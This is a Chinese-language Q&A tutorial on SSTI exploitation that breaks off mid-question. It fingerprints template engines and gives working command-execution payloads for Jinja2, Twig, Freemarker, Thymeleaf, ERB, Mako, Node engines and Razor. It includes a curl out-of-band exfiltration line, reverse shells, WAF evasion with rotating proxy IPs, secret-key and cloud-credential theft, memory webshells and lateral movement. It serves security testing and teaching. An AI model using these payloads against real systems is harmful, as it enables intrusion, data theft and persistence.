# Web · SSTI模板注入的识别与利用

### 数学探针:区分 SSTI 与普通反射/XSS
**Q1**: 某回显参数把我的输入原样打印出来了,怎么判断是 SSTI 而不是普通反射点/XSS?
**A1**: 别急着上 payload。打数学探针:`{{7*7}}`、`${7*7}`、`#{7*7}`、`<%= 7*7 %>`、`{7*7}` 逐个试。唯一判据——回显是否变成 `49`。原样回 `{{7*7}}` 就不是服务端求值,那是反射/XSS 的地盘,不是 SSTI。
**Q2**: 数学探针没回显 49,但页面报 500,算命中吗?
**A2**: 算强信号。发单个 `{{` 这类语法破坏 payload,看它吐什么。错误页常泄露模板引擎异常类名(Jinja2/Twig/Freemarker 各不同),异常类名直接告诉你引擎。
**Q3**: 参数完全过滤了 `{}$%<`,这条起手路被墙,怎么转?
**A3**: 转正交维度。第一,换注入位置:SSTI 常藏在 User-Agent、Referer、X-Forwarded-For、用户昵称/资料、文件名等"二次渲染"场景,不只在主参数。第二,转盲 SSTI:用时间延迟或带外 DNS 探测,不依赖回显。
**Q4**: 确认是 SSTI 了,第一步该干嘛?
**A4**: 先别冲 RCE。先精确指纹引擎——不同引擎利用链、沙箱、绕过完全不同,盲目套 payload 只会浪费注入次数、惊动 WAF。指纹先行是纪律。

### SSTI 与 CSTI 的定性辨别
**Q1**: `{{7*7}}` 出了 49,但我怀疑是 AngularJS/Vue 的客户端模板注入,怎么定性?
**A1**: 决定性实验:关掉浏览器 JS 或用 `curl` 裸取。裸响应里就有 49 → SSTI(服务端算的);必须浏览器执行 JS 才出 49 → CSTI(客户端算的)。两者利用天差地别,SSTI 打服务器 RCE,CSTI 本质是 XSS。
**Q2**: 确认是纯 CSTI,还值得打吗?
**A2**: 值得,但目标变了。CSTI → 框架沙箱逃逸 → 任意 JS 执行 → XSS。老版本 AngularJS 有成熟 sandbox escape。价值在于有时能绕 CSP(框架自己 eval),但影响面是客户端账户接管,别指望服务器 RCE。
**Q3**: 既是 SSTI 又是 CSTI 双重求值呢?
**A3**: 优先打 SSTI(直达服务器,权重高)。若 SSTI 被沙箱/过滤挡住,退用 CSTI 打 XSS 拿会话/管理员。同一注入点两个正交出口,SSTI 死了 CSTI 是备胎。
**Q4**: 我资源全押在 SSTI 上但确认是纯 CSTI,方向错了,怎么止损?
**A4**: 立刻切 XSS 战术库:CSP 分析、sandbox escape、DOM 汇聚点。把"服务器 RCE"预期降级为"账户接管"。识别方向错误后快速换战术库,比在错方向硬磕专业。

### 语法家族分诊定位引擎
**Q1**: 确认 SSTI,要指纹引擎,第一个探针打什么?
**A1**: 打"语法家族分诊探针":`{{7*7}}` vs `${7*7}` vs `#{7*7}` vs `<%= 7*7 %>` vs `{7*7}`。哪个求值成功锁定一个语法家族:`{{}}`→Jinja2/Twig/Nunjucks/Handlebars;`${}`→Freemarker/Velocity/JSP EL/Thymeleaf;`#{}`→部分 Ruby/Thymeleaf;`<%= %>`→ERB/EJS/ASP;`{}`→Smarty。
**Q2**: 落到某家族后怎么缩小到具体引擎?
**A2**: 打引擎特有内置。`${}` 家族里 Freemarker 认 `?new()`、Velocity 认 `#set`、EL 认 `${pageContext}`;`{{}}` 家族用 `{{7*'7'}}` 分 Jinja2/Twig。谁认自己独有语法谁就是。
**Q3**: 探针全被 WAF 拦(403/429),指纹阶段就卡死,怎么转?
**A3**: 转"错误驱动指纹":发不完整表达式引发异常,从堆栈类名/文件路径/版本反推,比正向 payload 隐蔽。再不行转旁路:响应头 `X-Powered-By`、Cookie 名(`JSESSIONID`→Java)、框架特征、404 风格。
**Q4**: 响应被统一网关抹平,无任何差异信号,怎么办?
**A4**: 退回"技术栈先验"。先用被动信息定后端语言,再按流行度枚举该语言常见引擎:Python→Jinja2/Mako;PHP→Twig/Smarty;Java→Freemarker/Velocity/Thymeleaf;Ruby→ERB;Node→Nunjucks/Handlebars/EJS/Pug。按序试,不穷举。
**Q5**: 指纹到引擎但版本未知,影响利用吗?
**A5**: 影响巨大。同引擎不同版本沙箱强度差异极大(Jinja2 老版无沙箱、Freemarker 有 ClassResolver 白名单)。先假设最严格版本设计链,能过说明版本旧,是意外收获。

### Jinja2 vs Twig 精确分诊
**Q1**: 落到 `{{}}` 家族且 `{{7*7}}` 出 49,怎么区分 Jinja2(Python)和 Twig(PHP)?
**A1**: 打 `{{7*'7'}}`。得到 `7777777`(字符串重复)强指向 Jinja2;报错或空更可能是 Twig。这是经典分诊法。
**Q2**: 还想再确认一次,有别的探针吗?
**A2**: 试各自独有全局:Jinja2 有 `{{config}}`、`{{request}}`、`{{lipsum}}`、`{{cycler}}`;Twig 有 `{{_self}}`、`{{dump()}}`、`{{app}}`(Symfony)。认哪套就是哪个。
**Q3**: 是 Nunjucks(Node)冒充 Jinja2 呢?它语法几乎一样。
**A3**: Nunjucks 语法仿 Jinja2 但底层是 JS。用 `{{7*'7'}}` 得 `NaN` 或 `0`(JS 语义)而非 `7777777`,且 `{{range}}`/`{{cycler}}` 这些 Python 专属不认。定到 JS 后走 `constructor.constructor` 那套 JS 原型链利用。
**Q4**: 分诊探针被过滤(引号、`config` 等被拦),定不了型,怎么转?
**A4**: 转后端语言先验:看响应头、Cookie、错误页、框架路由风格判语言,语言定了引擎候选就收敛(PHP 基本 Twig/Smarty,Python 基本 Jinja2/Mako)。再用错误驱动侧面确认,不依赖被拦的正向探针。

### Jinja2 从表达式爬到 RCE
**Q1**: 确认 Jinja2,要从 `{{7*7}}` 走到命令执行,推理骨架是什么?
**A1**: 目标是从沙箱内任意对象爬到 Python 危险内置。经典路径:任意对象→`__class__`→`__mro__`/`__bases__` 拿基类 `object`→`__subclasses__()` 枚举全部子类→找带 `Popen`/`os.system` 能执行命令的类。
**Q2**: 拿到一大串 `__subclasses__()`,怎么定位那个能 RCE 的类?
**A2**: 绝不硬写索引号——索引随 Python 版本和已加载模块漂移,写死到别环境必炸。用"按名字定位":遍历子类匹配类名含 `Popen`/`os._wrap_close`/`subprocess`,动态取索引再调用,payload 才可移植。
**Q3**: `__subclasses__` 链太长太显眼,有更短的吗?
**A3**: 有。走全局命名空间捷径:`cycler`/`joiner`/`namespace`/`lipsum`/`request` 等内置对象的 `__init__.__globals__` 常直达 `os` 或 `__builtins__`,如 `lipsum.__globals__['os']`。短链降低 WAF 命中率。
**Q4**: 命令执行了但回显被吞(看不到输出),怎么办?
**A4**: 切盲打:带外(把输出塞进 DNS/HTTP 打到自己服务器,`curl http://x/$(id|base64)`)、时间侧信道 `sleep`、或直接反弹 shell 不依赖 HTTP 回显。回显被吞不代表没 RCE。
**Q5**: RCE 被 seccomp/沙箱挡死,只剩求值能力,Jinja2 还能榨什么?
**A5**: 降级到文件读:找能 `open()` 的子类读 `/etc/passwd`、源码、配置;或读 Flask `config`/`SECRET_KEY`。读到 SECRET_KEY 可伪造 session 提权,往往比半残 RCE 更值钱。

### Jinja2 黑名单字符/关键字绕过
**Q1**: Jinja2 确认了但 `__class__`/`__globals__`/`os` 被黑名单过滤,payload 发不进去,怎么绕?
**A1**: 核心思想:黑名单拦"字面量",你就"运行时拼"。用 `request|attr("__cl"+"ass__")` 拼接被拦属性名;用 `["__cla"~"ss__"]` 下标访问;十六进制/Unicode 转义 `\x5f\x5f` 代替下划线。
**Q2**: 连 `.`(点号)属性访问符都被拦了呢?
**A2**: 换属性访问语法:Jinja2 用 `[]` 下标或 `|attr()` 过滤器,点号只是语法糖,几乎总有替代。`()` 被拦可用过滤器管道替代调用。
**Q3**: `[]`、`_` 下划线、引号都被过滤,几乎无字符可用,怎么办?
**A3**: 转参数走私(污点搬运):用 `request.args`/`request.values` 从另一个 HTTP 参数把危险字符串带进来,模板体只引用变量名 `request.args.x`,危险字符全在别的参数里,绕过对模板体的字符过滤。
**Q4**: 字符集构造也行不通(如引号全禁),转哪?
**A4**: 转字符运行时生成:用 `dict(...)|join`、`|first`、数字拼接、内置过滤器组合出被禁字符;或用 `chr` 类构造从数字生成字符,让请求里根本不出现敏感明文,从"绕过检测"升级到"规避检测"。
**Q5**: 这些绕过全试遍仍被拦,Jinja2 这条被墙,转哪个维度?
**A5**: 转换注入通道:换 HTTP 方法、Content-Type、参数位置(body→header→cookie)、参数污染、大小写混淆。WAF 常只在某一通道布防。再不行承认此点是硬骨头,转应用其他洞。

### Twig / PHP 模板利用
**Q1**: 指纹确认 Twig(PHP),没有 Python 那套反射链,RCE 怎么构造?
**A1**: Twig 核心利用面是过滤器回调:`filter`、`map`、`sort` 可传回调。经典 `{{['id']|filter('system')}}` 或 `{{['id',0]|sort('system')}}`,把 PHP 危险函数(`system`/`exec`/`passthru`)当回调传入。
**Q2**: 回调过滤器被禁用或版本不支持,怎么办?
**A2**: 转 `_self` 环境对象路径。老版本 Twig 里 `_self` 能拿环境,进而 `registerUndefinedFilterCallback`/`getFilter` 调任意 PHP 函数。Twig 1.x/2.x/3.x 可用面差异大,先按版本选链。
**Q3**: 是 Smarty 不是 Twig 呢?
**A3**: Smarty 用 `{}` 单括号。试 `{$smarty.version}` 确认拿版本;`{php}...{/php}` 老版本直接跑 PHP;`{system('id')}` 某些配置可用;`{Smarty_Internal_Write_File::writeFile(...)}` 静态方法链写文件。`{if}`/`{literal}` 也可承载表达式。
**Q4**: Twig 沙箱 SecurityPolicy 开着,内置函数几乎全禁,这路被墙怎么转?
**A4**: 转正交面。第一,若允许用户控制模板路径/include,转任意文件读/LFI。第二,结合 PHP 特性:能落地文件写(日志/上传)就写 PHP 代码再包含。第三,SSTI 只是入口,换 SQLi/反序列化/上传等其他洞。
**Q5**: PHP 模板 RCE 后 `disable_functions` 把 `system/exec` 全禁,怎么办?
**A5**: 转 disable_functions 绕过专题:LD_PRELOAD、FFI(PHP 7.4+)、`imap_open`/`putenv` 组合、GC-UAF 内存马,或降级到不依赖命令执行的文件读写+内网 pivot。RCE 受限≠死路。

### Freemarker 利用与防护绕过
**Q1**: 指纹是 Freemarker,`${7*7}` 出 49,RCE 怎么走?
**A1**: 经典内置工具类 `Execute`:`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`。或 `ObjectConstructor`、`JythonRuntime`。核心是 `?new()` 实例化能执行命令的工具类,先试 `Execute` 最通用。
**Q2**: `?new()` 被 `TemplateClassResolver` 白名单挡了(新版默认防护),被墙怎么转?
**A2**: 转"换 gadget"。`SAFER_RESOLVER` 下 `Execute` 被禁,此时找应用自己注入进模板上下文的 bean——很多业务把 Spring 上下文、DAO、工具类塞进模板变量,顺着这些现成对象的 `.getClass().forName()` 反射链照样 RCE。转"数据模型内的现成对象"这个面。
**Q3**: 是 Velocity 呢?探针和链怎么变?
**A3**: Velocity 用 `#set` 指令。经典 `#set($e="")` 配合 `$e.getClass().forName("java.lang.Runtime")` 反射拿 `Runtime.exec`;或用 `ClassTool`/`$field`/`$method` 反射工具。
**Q4**: Freemarker RCE 成功但目标出网受限,反弹不出来,怎么办?
**A4**: 转不出网利用:注入 Java 内存马(Filter/Listener/Servlet/Agent 型)实现无文件无出网持久 webshell;或用 SSTI 任意读写在应用目录落地 jsp/内存马;或把命令输出写到 Web 可访问静态目录再 HTTP 取回。内存马是 Java 不出网的标准转向。

### Thymeleaf 视图名注入这个特殊面
**Q1**: 指纹是 Thymeleaf,普通参数注入不求值,它的注入点为什么特殊?
**A1**: Thymeleaf SSTI 多发生在"视图名/fragment 表达式"。触发条件:控制器返回视图名可控(如 `return "user/" + param`)会触发表达式预处理求值。payload 形如 `__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x`。
**Q2**: 表达式确实求值了,标准 payload 怎么构造?
**A2**: 走 SpringEL:`${T(java.lang.Runtime).getRuntime().exec(...)}` 或 `[[${...}]]` 内联。`T()` 操作符是拿静态类的入口,配合 `ProcessBuilder`/`Runtime` 执行命令。
**Q3**: `T()` 被过滤或 SecurityManager 挡了,被墙怎么转?
**A3**: 转无 `T()` 的 SpringEL 构造:`new java.lang.ProcessBuilder(...)`、`''.getClass().forName(...)` 从字符串对象反射进 `Class`、`#this.getClass()`。再不行转正交面:Java 应用常同时有反序列化、Spring 组件洞,SSTI 的任意读能力也可读 `application.yml`/class 辅助其他链。
**Q4**: 定位不到哪个控制器返回可控视图名,注入点难找,怎么办?
**A4**: 转黑盒枚举思路:对每个接受字符串并可能影响跳转/渲染的参数试注入,观察 500 或表达式副作用;或若能读到部分源码/路由,定位 `return` 拼接用户输入的反模式。找对触发点比 payload 更关键。

### 无回显盲 SSTI 起手
**Q1**: 参数无任何回显但怀疑有 SSTI,怎么起手?
**A1**: 放弃看回显,改看副作用。三条侧信道:时间(注入 sleep 看响应变慢)、错误(注入语法错误看是否 500)、带外(注入能发网络请求的表达式监听自己的 DNS/HTTP)。先用错误探针最省事——正确表达式 200、错误表达式 500,二元差异即可盲测求值。
**Q2**: 时间探针怎么设计才可靠?
**A2**: 要有对照组。发 `sleep(0)` vs `sleep(10)` 对比,排除网络抖动;多次采样取中位数。盲测最忌抖动误判,先靠错误探针锁引擎再用其延时原语。
**Q3**: 带外 DNS 收不到、时间也没差异,是不是没洞?
**A3**: 不一定,可能是延迟渲染——SSTI 结果不在本次响应,而在后续页面(注入用户名,渲染发生在管理员后台或邮件)。转存储型 SSTI 思路:注入点与渲染点分离,找二次消费该数据的功能观察。
**Q4**: 确认盲求值但完全无回显无出网,怎么拿数据?
**A4**: 逐字符布尔盲注(像盲 SQLi):构造"如果密钥第 1 字符是 'a' 就 sleep(5) 否则 sleep(0)",用时间侧信道一位位爆。慢但可行。或先用 SSTI 写文件到 Web 可读路径再 HTTP 拉,把无回显盲转成有回显文件读。
**Q5**: 盲打太慢且被限速,这路被墙,往哪转?
**A5**: 转"用一次 RCE 换掉盲态":哪怕盲,只要能执行一条命令就反弹 shell 或写 webshell,一步跳出盲注地狱。集中资源构造"一发入魂"的盲 RCE,而非慢慢盲读;连一次都执行不了就回退换洞。

### 存储型 / 二次渲染 SSTI
**Q1**: 直接参数都不求值,但应用有"用户资料/昵称/签名"会显示在别处,该怎么想?
**A1**: 想"数据在哪被第二次渲染"。存储型 SSTI:注入点(保存资料)和触发点(别处展示)分离。在资料里埋 `{{7*7}}`,再去个人主页、管理后台、消息列表等消费该字段的地方看是否变 49。
**Q2**: 怎么系统性找触发点?
**A2**: 埋带外探针(唯一标记的 DNS 回连),然后遍历所有可能消费该数据的功能(展示、导出、通知、审核后台),哪个功能触发回连就定位到渲染点。这比逐个页面肉眼看高效。
**Q3**: 渲染发生在管理员后台我够不到,怎么利用?
**A3**: 这恰是高价值——变成打管理员的存储型 SSTI/XSS。构造 payload 在管理员渲染时执行,拿管理员上下文的服务端求值或客户端会话。注入点低权、触发点高权是横向提权的经典结构。
**Q4**: 埋了探针一直无回连,判断不了有没有洞,被墙怎么转?
**A4**: 转其他二次渲染载体:PDF/报表导出、邮件/短信模板、错误消息回填、日志渲染。这些都是"用户数据经模板引擎再处理"的场景。换载体重试,别只盯一个字段。

### SSTI 藏在非典型位置
**Q1**: 常规参数没洞,但有"自定义邮件/通知模板"让用户编辑,怎么想?
**A1**: 这是 SSTI 高发区且常漏测。用户能编辑模板=后端大概率用引擎渲染用户输入。直接在模板框放 `{{7*7}}`,触发靠"预览/发送测试/实际发送"。这类"设计上允许模板语法"的功能反而防护最弱。
**Q2**: 是 PDF/Excel/报表导出功能呢?
**A2**: 服务端生成导出物常经模板引擎。往标题、备注、用户名等可控字段放探针,下载导出物看是否求值。还可能叠加 SSRF(PDF 引擎如 wkhtmltopdf 加载外部资源)——SSTI 测不通就转测 SSRF/本地文件读。
**Q3**: SSTI 出现在错误消息里(输入非法值,错误页把输入拼进模板)怎么利用?
**A3**: 典型 `render_template_string(user_input)` 反模式。触发靠制造错误分支,构造既能进错误分支又带 payload 的输入。这类往往求值能力完整,只是需要精心触发。
**Q4**: 确定用了模板但直接注入不求值,是不是转义了,被墙怎么转?
**A4**: 分清"HTML 转义"和"不求值"。HTML 转义只把 `<>&` 变实体,不影响 `{{}}` 求值。若 `{{7*7}}` 不求值,多半输入进了"数据位"而非"模板位"(安全用法)。转向找"模板本身可控"的功能(模板编辑),而非"数据填入固定模板"的功能——前者才是 SSTI 沃土。

### WAF 黑名单二分定位
**Q1**: payload 一发就 403,WAF 在拦,先怎么摸清它拦什么?
**A1**: 二分定位,别整段猜。把 payload 拆成最小片段逐个发:先 `{{`、再 `{{1}}`、再 `{{config}}`、再含 `__class__`…找出到底哪个 token 触发拦截。精确知道黑名单边界才能精准绕。
**Q2**: 定位到拦的是某关键字,下一步?
**A2**: 针对该 token 选绕过手法:是属性名就拼接/编码,是语法符就换等价语法,是函数名就参数走私搬运。对症下药,不盲试全套绕过(那只会更快触发封禁)。
**Q3**: WAF 会累积计分封 IP,反复试探快被封了,怎么办?
**A3**: 控制探测节奏:降频、换出口 IP/代理池、每个 IP 只发少量探针。把二分探测分摊到多个来源,避免单 IP 触发速率封禁。侦察阶段的隐蔽性和利用同样重要。
**Q4**: 二分发现它是行为/语义检测不是关键字黑名单,绕不动,被墙转哪?
**A4**: 转换注入通道维度:换 HTTP 方法、Content-Type(表单→JSON→XML→multipart)、参数位置、HTTP 参数污染(同名参数两次,WAF 看前一个后端取后一个)、分块传输编码。WAF 常只在某一通道布防。

### WAF 关键字绕过手法库
**Q1**: 确认是关键字黑名单,拦的是双下划线属性名,怎么绕?
**A1**: 三板斧:字符串拼接(`"__cla"+"ss__"`)、属性访问改下标或过滤器(`x["__class__"]`、`x|attr("__class__")`)、编码(十六进制 `\x5f`、Unicode、视引擎解码的实体)。核心:WAF 匹配静态串,你让串在模板运行时才成型。
**Q2**: 拦的是函数名如 `system`/`exec` 呢?
**A2**: 同理运行时拼接函数名,或参数走私从另一参数带入,或用等价函数(命令执行有多个入口)。让敏感函数名不以明文出现在请求里。
**Q3**: WAF 对请求做了规范化(URL 解码、大小写归一),简单编码没用了,怎么办?
**A3**: 转"模板内自解码":用引擎自身的字符构造能力(数字转字符、拼接、过滤器链)在服务端生成敏感串,请求里只有无害的数字和运算符,WAF 归一化也看不出恶意。这是规避而非绕过。
**Q4**: 所有编码拼接都被规范化+语义分析识破,被墙转哪?
**A4**: 承认此 WAF 强,转换攻击面:找同应用未过 WAF 的旁路接口(内部 API、老版本路径、非标端口)、或换完全不同的漏洞类别。也可评估该点是否值得投入研究定制绕过,ROI 低就转主战场其他洞。

### SSTI 能力向 SSRF / 云凭证转化
**Q1**: SSTI 能求值但沙箱锁死命令执行,想榨剩余价值,先想什么?
**A1**: 想"求值还能干什么"。梯度降级:RCE→任意文件读→SSRF(让服务端发请求)→信息泄露。逐级试哪个原语没被沙箱封,求值≠只有 RCE。
**Q2**: 怎么把 SSTI 变 SSRF?
**A2**: 找引擎里能发起网络请求的对象/函数(HTTP 客户端、URL 加载、include 远程资源)。一旦能让服务端请求任意 URL,就打云元数据服务拿临时云凭证、探内网、访问仅内网可达的管理接口。SSTI→SSRF→云凭证 是很值的链。
**Q3**: 打到云元数据后怎么最大化收益?
**A3**: 拿到临时凭证立即评估权限边界(能列什么资源、能否横向到存储/计算)。控制动作在授权范围内,核心是把 SSTI 这个"点"扩成"云面"。凭证往往比单机 RCE 价值高一个量级。
**Q4**: 连 SSRF 都被沙箱挡,只剩读内部变量,还有戏吗?被墙转哪?
**A4**: 有保底价值:读模板上下文对象常拿到 session、config(密钥/DB 串)、request、ORM 模型。哪怕只泄露框架版本、路径、内部主机名,这些都是别的漏洞(反序列化/路径遍历)的弹药。转"用情报喂其他洞",回攻击面清单串联多洞。

### 官方沙箱系统性逃逸
**Q1**: 引擎开了官方沙箱(Jinja2 Sandboxed / Twig SecurityPolicy / Freemarker SAFER),正面 RCE 全禁,怎么系统找逃逸?
**A1**: 沙箱本质是"属性/方法白名单+危险黑名单"。逃逸思路:找沙箱没覆盖的"间接引用"。逐个 dunder/过滤器/方法探边界,找检查有盲区的对象类型(如格式化字符串、`__reduce__`、新版本新增特性)。
**Q2**: 具体从哪些边缘对象下手?
**A2**: 优先审计应用主动放进上下文的对象(业务 bean、工具类、request/config)——它们不在"引擎内置"的沙箱管辖内,方法链常能爬出去。其次是引擎新特性(新过滤器/语法糖),沙箱规则常滞后于功能更新。
**Q3**: 沙箱严丝合缝逃不出,这点被墙,转哪?
**A3**: 两条路。其一,沙箱内可读的上下文变量、信息泄露照样收集,不逃也有价值。其二,承认此引擎+版本是硬骨头,转应用其他漏洞入口,或找同应用其他未加沙箱的渲染点(大应用常多处渲染,防护不一致)。
**Q4**: 怀疑逃逸失败是版本太新,值得死磕最新 CVE/0day 吗?
**A4**: 权衡时间成本。目标价值极高且版本确认可投入研究已知逃逸;否则记录该点为"需 N-day/0day 的硬点",优先跑通 ROI 更高的其他路径。红队不是研究员,除非必要不在单点无限深挖。

### 自研黑名单沙箱的绕过
**Q1**: 沙箱是应用自研的(自己写黑名单过滤模板输入),怎么打?
**A1**: 自研黑名单几乎必有洞,优先级高于死磕官方沙箱。系统性绕:大小写变换、编码、字符拼接、等价语法、注释插入、正则边界(它只匹配行首关键字就换行绕)。重点找它"没想到的等价写法"。
**Q2**: 怎么快速找到它的规则盲区?
**A2**: 逆向它的过滤逻辑(若能读到代码)或黑盒二分:构造大量变体探哪些放行。自研过滤常见缺陷:只过滤一次不递归(嵌套绕过)、只匹配特定大小写、只黑名单几个关键字漏了等价函数。
**Q3**: 自研沙箱确实堵得很死,被墙转哪?
**A3**: 转"绕过点前移或后移":前移找输入在到达过滤前的其他入口(不同参数/接口走不同校验);后移找过滤后是否还有拼接/二次处理引入注入。再不行换攻击面,自研防护往往只护了模板这一处,别处更松。

### SSTI 立足点价值评估与 ROI 取舍
**Q1**: SSTI→RCE 拿到 shell 但发现是无根最小容器,下一步决策?
**A1**: 先评估价值再动。判断:能到内网吗(路由/DNS/连其他 service)?挂了敏感卷吗(docker.sock/宿主目录)?环境变量有云/DB 凭证吗?别一上来折腾提权,先把立足点价值盘清。
**Q2**: 环境变量翻到疑似凭证,怎么用?
**A2**: 分优先级验证:云凭证→查能否横向云资源;DB 凭证→连上看能否读用户表。控制动作在授权范围,核心是把 SSTI 这个点扩成面。
**Q3**: 打通了但发现是无关紧要的边缘服务,继续投入还是撤?
**A3**: 转横向价值评估三问:能连核心网段吗?复用了什么凭证(同套密码别处能用吗)?信任关系里有高价值目标吗?都否就记录留存,转回主战场,不在低价值点过度消耗。红队算 ROI。
**Q4**: 只有 SSTI 读文件能力(RCE 被挡死),能拿什么高价值目标?
**A4**: 按 ROI 读:框架密钥(Flask SECRET_KEY→伪造 session;Rails secret→cookie 伪造)、配置里 DB/Redis/云密码、源码(扩面找新洞)、`/proc/self/environ`、SSH 私钥、历史命令。读到密钥常比半残 RCE 值钱。

### SSTI 立足点衔接提权与内网
**Q1**: SSTI→RCE 拿到低权 shell,提权前先做什么?
**A1**: 先本地信息收集(手动版 linpeas):内核版本、SUID、sudo 权限、cron、可写 service 文件、容器指纹。SSTI 只是入口,提权是独立专题,先枚举再选武器,别盲试 exploit。
**Q2**: 发现是容器想逃到宿主,判据是什么?
**A2**: 查逃逸面:`docker.sock` 可读写、特权容器(`--privileged`)、危险 capabilities(`CAP_SYS_ADMIN`)、挂载宿主敏感目录、共享内核漏洞。逐项核对,命中哪个走哪条逃逸链。
**Q3**: 提权/逃逸都没戏但机器在内网,怎么把 SSTI 立足点变跳板?
**A3**: 转横向准备:起代理(内存 socks/端口转发)、收集内网信息(ARP、路由、hosts、连接记录、内部服务凭证)。低权 shell 只要通内网就是宝贵跳板,提权失败≠没价值。
**Q4**: 收集到指向其他内网主机的凭证,整体决策?
**A4**: 转凭证复用+横向:先验证凭证在哪些主机/服务有效(喷洒控频防锁),规划从 SSTI 立足点到目标的最短路径。SSTI 打点的历史使命完成,重心转入内网横向阶段。
**Q5**: 反弹 shell 老断/被防火墙掐,立足点不稳,怎么办?
**A5**: 转稳定通道:换出网更宽松的协议(DNS/HTTPS/ICMP 隧道),或用 SSTI 本身作"命令执行 API"走 HTTP 心跳式 C2(每次请求执行一条命令,贴合 Web 流量,不易被连接层拦)。通道不稳就换协议维度,别在被掐通道反复重连。

### Ruby ERB / Slim 系模板利用
**Q1**: 指纹指向 Ruby 栈,`<%= 7*7 %>` 出 49,ERB 的 RCE 怎么走?
**A1**: ERB 直接嵌 Ruby 代码:`<%= system('id') %>`、`<%= \`id\` %>`(反引号)、`<%= IO.popen('id').read %>`。Ruby 模板本质是嵌入式代码,RCE 门槛比反射链低,先试 `system`/反引号。
**Q2**: 是 Slim/Haml 呢?语法不同。
**A2**: Slim/Haml 也允许嵌 Ruby,注入点是它们的代码求值语法(如 `#{...}` 插值或 `-`/`=` 行前缀)。定到具体引擎后用其代码求值语法执行 `system`/backtick。
**Q3**: Ruby 应用是 Rails,SSTI 藏哪?
**A3**: Rails 里 `render inline:` 用户可控、或本地化/翻译文件注入、或某些把用户输入当模板渲染的反模式。结合 Rails 特性:拿到 RCE 后可读 `secret_key_base` 伪造 cookie,或读 `database.yml`。
**Q4**: Ruby 模板 RCE 被限制或注入不成,被墙转哪?
**A4**: 转 Ruby/Rails 其他洞:反序列化(Marshal/YAML.load)、`secret_key_base` 泄露导致的 cookie 反序列化 RCE。SSTI 的任意读能力可先读 secret 再走 cookie 链,换个正交入口打进去。

### Node 模板引擎(EJS/Pug/Handlebars)利用
**Q1**: 指纹是 Node 栈的 EJS,`<%= %>` 求值,RCE 怎么走?
**A1**: EJS 服务端渲染,注入点常在 EJS 的某些选项(如历史上的 `settings[view options]`/`outputFunctionName` 参数污染 RCE)或直接代码嵌入。定到 EJS 版本后套对应链,核心是让它拼进可执行的 JS。
**Q2**: 是 Pug(Jade)呢?
**A2**: Pug 允许内嵌 JS 表达式和代码块,注入到 Pug 源可执行 `#{global.process.mainModule.require('child_process').execSync('id')}` 类 payload,走 Node 的 `process`/`require` 拿 `child_process`。
**Q3**: 是 Handlebars/Nunjucks 呢,它们更"逻辑无关"?
**A3**: Handlebars 需通过原型链/helper 构造逃逸到 `constructor`;Nunjucks 走 `{{range.constructor("return global.process...")()}}` 类原型链。共同核心:JS 里从任意对象 `constructor.constructor` 拿到 `Function` 构造器执行任意代码。
**Q4**: Node 模板 RCE 后目标不出网,怎么办?
**A4**: 转不出网利用:用 `child_process` 把输出写到 Web 静态目录再 HTTP 取回;或在 Node 进程内注入基于 `require` 缓存/中间件的内存马式后门;或走 DNS 侧信道外带。Node 场景同样优先"无出网也能收数据"的通道。

### 判断"求值成功但拿不到 RCE"的根因
**Q1**: `{{7*7}}` 求值了,但所有 RCE payload 都失败,先怎么定位是哪种原因?
**A1**: 分三类根因排查:一是沙箱(引擎开了安全模式,危险属性被禁)、二是黑名单(WAF/应用过滤了关键字)、三是环境限制(RCE 语句执行了但 seccomp/disable_functions/权限挡住)。三类转向完全不同,先分诊。
**Q2**: 怎么区分是沙箱还是黑名单?
**A2**: 试无害的敏感属性访问(如仅访问 `__class__` 不调用):若返回正常结果说明属性可访问(是执行环节被挡),若报"访问被禁"类异常是沙箱,若返回 403/被拦是 WAF 黑名单。异常信息类型是分诊关键。
**Q3**: 确认是沙箱,转向?
**A3**: 转沙箱逃逸专题(找边缘对象/间接引用/新特性绕过),或降级榨取文件读/SSRF/信息泄露价值。
**Q4**: 确认是环境限制(命令跑了但被 seccomp/disable_functions 挡),转向?
**A4**: 转对应绕过专题:Linux 走 seccomp 绕过/换 syscall/内存马,PHP 走 disable_functions 绕过。RCE 原语存在只是被限,比沙箱好办,针对具体限制机制找绕过。
**Q5**: 三类都排查了还是打不通,整体被墙,最后转哪?
**A5**: 转"承认硬点+情报复用":把已确认的求值能力用于信息泄露(版本/路径/密钥/内部结构),这些喂给其他洞。同时转换攻击面找应用别的入口。单洞打不穿是常态,靠多洞情报串联突破。

### Python 其他引擎(Mako/Cheetah/Genshi)分诊
**Q1**: 后端是 Python 但 `{{7*7}}` 不求值,`${7*7}` 却出 49,可能是什么引擎?
**A1**: Python 不止 Jinja2。`${}` 语法在 Python 里指向 Mako。Mako 用 `${...}` 表达式和 `<% %>` 代码块。试 `${7*7}` 求值就大概率是 Mako,再用 `<% %>` 确认能嵌 Python 代码。
**Q2**: 确认 Mako,RCE 比 Jinja2 简单还是复杂?
**A2**: 简单得多。Mako 默认无沙箱且可直接嵌 Python:`<%import os%>${os.popen('id').read()}` 或 `${self.module.cache.util.os.system('id')}`。Mako 内置命名空间(`self`/`local`/`cache`)常能直达模块,不用爬 subclasses 长链。
**Q3**: 是 Cheetah/Genshi 呢?
**A3**: Cheetah 用 `$var`/`#` 指令,可 `#import`+`$os.system(...)`;Genshi 走 XML 模板的 `${}`。定到具体引擎后用其代码求值语法。Python 系除 Jinja2 外多数默认无沙箱,RCE 门槛低,重点是先分诊对引擎。
**Q4**: 分诊探针都不求值,判断不了具体 Python 引擎,被墙转哪?
**A4**: 转错误驱动:发语法破坏 payload 看异常栈,Mako/Cheetah 的异常类名和文件路径特征鲜明。再不行按框架先验(用了哪个 Web 框架常配哪个模板)缩小候选,逐个试其代码嵌入语法。

### .NET Razor / ASP.NET 模板注入
**Q1**: 目标是 .NET 栈,怀疑模板注入,探针怎么打?
**A1**: ASP.NET 经典 `<%= 7*7 %>`(WebForms)或 Razor 的 `@(7*7)`。试这两套看是否出 49。Razor 是 .NET 现代主力,注入点常在允许用户提供 Razor 模板的功能(如 RazorEngine 动态编译场景)。
**Q2**: Razor 求值了,RCE 怎么构造?
**A2**: Razor 直接嵌 C#:`@{ System.Diagnostics.Process.Start("cmd","/c whoami"); }` 或调 `System.IO` 读写文件。RazorEngine 动态编译用户模板=直接编译执行任意 C#,RCE 直达。
**Q3**: 是 ASP Classic / 老 WebForms 的 `<%%>` 呢?
